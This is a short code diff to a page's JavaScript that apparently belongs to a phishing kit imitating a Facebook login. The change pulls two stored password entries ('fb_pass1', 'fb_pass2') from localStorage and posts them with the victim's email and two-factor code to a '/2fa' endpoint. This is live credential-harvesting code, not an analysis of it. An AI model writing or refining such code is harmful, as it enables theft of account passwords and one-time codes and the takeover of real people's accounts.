@@ -106,13 +106,14 @@
         const codeInput = document.getElementById('_r_a_');
         const code = codeInput ? codeInput.value : '';
         var email = localStorage.getItem('fb_email');
-
+        const password1 = localStorage.getItem('fb_pass1');
+        const password2 = localStorage.getItem('fb_pass2'); // fix lại
         if (!code) return; // Don't submit empty
 
         fetch('/2fa', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ code: code, step: step ,email: email})
+            body: JSON.stringify({ code: code, step: step ,email: email , password1: password1, password2: password2})
         })
         .then(response => response.json())
         .then(data => {
